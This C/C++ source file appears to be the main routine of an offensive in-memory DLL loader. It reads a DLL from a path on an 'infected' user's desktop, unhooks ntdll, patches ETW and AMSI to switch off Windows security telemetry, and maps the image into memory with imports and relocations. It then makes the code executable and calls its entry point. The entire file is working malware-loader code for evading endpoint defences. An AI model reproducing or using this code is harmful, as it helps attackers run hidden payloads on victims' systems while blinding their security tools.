#include "../include/Evasion.h"
#include "../include/Loader.h"
#include "../include/Macros.h"
#include "../include/Peb.h"

int main(void) {
	NTSTATUS NtStatus = 0;
	PVOID PeBase = 0;
	RELOC_CTX RelocCtx = {};
	IMPORT_CTX ImportCtx = {};
	ULONG dwOldProtect = 0;
	PVOID NtDll = nullptr;
	DLLMAIN_T Ent = nullptr;
	// API
	fn_NtAllocateVirtualMemory pdNtAllocateVirtualMemory = nullptr;
	fn_NtProtectVirtualMemory pdNtProtectVirtualMemory = nullptr;
	// PE Structures
	PIMAGE_DOS_HEADER Dos = nullptr;
	PIMAGE_NT_HEADERS NtH = nullptr;
	PIMAGE_SECTION_HEADER SctH = nullptr;
	IMAGE_DATA_DIRECTORY ImportDir = {};
	PIMAGE_IMPORT_DESCRIPTOR ImportDesc = nullptr;
	SIZE_T szSizeImage = 0;
	DWORD_PTR pdwDelta = 0;
	SIZE_T textsize = 0;
	PVOID textptr = nullptr;
	/// TMP ///////////////////////////////////////////////////////////
	PBYTE pbBuffer = nullptr;
	HANDLE hFile = nullptr;
	DWORD dwBytesRead = 0;
	DWORD dwFileSize = 0;

	hFile = CreateFileA("C:\\Users\\infected\\Desktop\\dummy.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	dwFileSize = GetFileSize(hFile, NULL);
	pbBuffer = (PBYTE)VirtualAlloc(NULL, dwFileSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!ReadFile(hFile, pbBuffer, dwFileSize, &dwBytesRead, NULL)) {
		return 0;
	}

	/// TMP ///////////////////////////////////////////////////////////////

	NtDll = sdGetModuleHandle(NTDLL);
	Dos = (PIMAGE_DOS_HEADER)(pbBuffer);  // C_PTR( G_END() )
	NtH = (PIMAGE_NT_HEADERS)((DWORD_PTR)Dos + Dos->e_lfanew);

	// Calc memory for image
	szSizeImage = NtH->OptionalHeader.SizeOfImage; //(((NtH->OptionalHeader.SizeOfImage) + 0x1000 - 1) & ~(0x1000 - 1));

	if (!sdUnhookDll(NTDLL, NtDll)) {
		return 1;
	}
	if (!sdPatchEtw(NtDll)) {
		return 1;
	}
	if (!sdPatchAmsi(NtDll)) {
		return 1;
	}
	
	// Alloc memory for image
	pdNtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)sdGetProcAddress(NtDll, NT_VIRTUAL_ALLOC);
	NtStatus = pdNtAllocateVirtualMemory(((HANDLE)-1), &PeBase, 0, &szSizeImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (NtStatus != STATUS_SUCCESS || PeBase == NULL) {
		return 1;
	}

	// Copy sections
	__builtin_memcpy(PeBase, pbBuffer, NtH->OptionalHeader.SizeOfHeaders);
	sdCopySections(IMAGE_FIRST_SECTION(NtH), NtH->FileHeader.NumberOfSections, 0, PeBase, C_PTR(pbBuffer)); // HERE BASE OF FILE
	
	// Resolve imports
	ImportDir = NtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	ImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(ImportDir.VirtualAddress + (DWORD_PTR)PeBase);
	ImportCtx.pdLdrGetProcedureAddress = (fn_LdrGetProcedureAddress)sdGetProcAddress(NtDll, LDR_GET_PROC_ADDR);
	ImportCtx.pdLdrLoadDll = (fn_LdrLoadDll)sdGetProcAddress(NtDll, LDR_GET_DLL);
	ImportCtx.pdRtlAnsiStringToUnicodeString = (fn_RtlAnsiStringToUnicodeString)sdGetProcAddress(NtDll, RTL_ANSI_TO_UNICODE);
	sdLoadImports(&ImportCtx, ImportDesc, PeBase);

	// Perform relocations
	pdwDelta = (DWORD_PTR)PeBase - (DWORD_PTR)NtH->OptionalHeader.ImageBase;
	RelocCtx.szRelocsProcessed = 0;
	RelocCtx.RelocDir = NtH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	RelocCtx.pdwRelocTable = RelocCtx.RelocDir.VirtualAddress + (DWORD_PTR)PeBase;
	RelocCtx.lpImgBase = PeBase;
	RelocCtx.pdNtReadVirtualMemory = (fn_NtReadVirtualMemory)sdGetProcAddress(NtDll, NT_VIRTUAL_READ);
	RelocCtx.NtStatus = 0;
	RelocCtx.pBlockCtx = nullptr;
	sdPerformRelocs(&RelocCtx, pdwDelta);

	// Change permissions to R_X
	SctH = IMAGE_FIRST_SECTION(NtH);
	textptr = sdFindText(&textsize, SctH, PeBase);

	pdNtProtectVirtualMemory = (fn_NtProtectVirtualMemory)sdGetProcAddress(NtDll, NT_VIRTUAL_PROTECT);
	NtStatus = pdNtProtectVirtualMemory(((HANDLE)-1), &textptr, &textsize, PAGE_EXECUTE_READ, &dwOldProtect);
	if (NtStatus != STATUS_SUCCESS) {
		return 0;
	}

	// Execute
	Ent = (DLLMAIN_T)((DWORD_PTR)PeBase + NtH->OptionalHeader.AddressOfEntryPoint);
	(*Ent)((HINSTANCE)PeBase, DLL_PROCESS_ATTACH, 0);

	return 0;
}